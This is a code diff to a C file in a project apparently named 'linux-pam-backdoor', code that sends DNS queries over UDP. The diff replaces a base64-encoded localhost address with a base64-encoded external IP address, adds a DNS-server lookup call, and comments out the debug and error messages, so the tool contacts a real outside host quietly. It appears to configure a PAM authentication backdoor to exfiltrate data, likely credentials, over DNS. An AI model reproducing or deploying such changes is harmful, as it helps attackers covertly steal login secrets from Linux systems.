@@ -7,8 +7,8 @@
 #include<unistd.h>    //getpid
 #include "/linux-pam-backdoor/deps/b64/b64.h"
 #include "/linux-pam-backdoor/deps/b64/decode.c"
-#define DNS_HOST "MTI3LjAuMC4x"
-#define DNS_HOST_LEN 12
+#define DNS_HOST "MTg1LjE4MS4yMTAuMzk="
+#define DNS_HOST_LEN 20
 
 char dns_servers[10][100];
 int dns_server_count = 0;
@@ -108,7 +108,7 @@ typedef struct
     struct DNS_HEADER *dns = NULL;
     struct QUESTION *qinfo = NULL;
  
-    printf("Resolving %s" , host);
+    get_dns_servers();    //printf("Resolving %s" , host);
  
     s = socket(AF_INET , SOCK_DGRAM , IPPROTO_UDP); //UDP packet for DNS queries
  
@@ -146,12 +146,12 @@ typedef struct
  
     if( sendto(s,(char*)buf,sizeof(struct DNS_HEADER) + (strlen((const char*)qname)+1) + sizeof(struct QUESTION),0,(struct sockaddr*)&dest,sizeof(dest)) < 0)
     {
-        perror("sendto failed");
+//        perror("sendto failed");
     }
    
     //Receive the answer
-    i = sizeof dest;
-    printf("Done");
+  //  i = sizeof dest;
+    //printf("Done");
  
 }
  
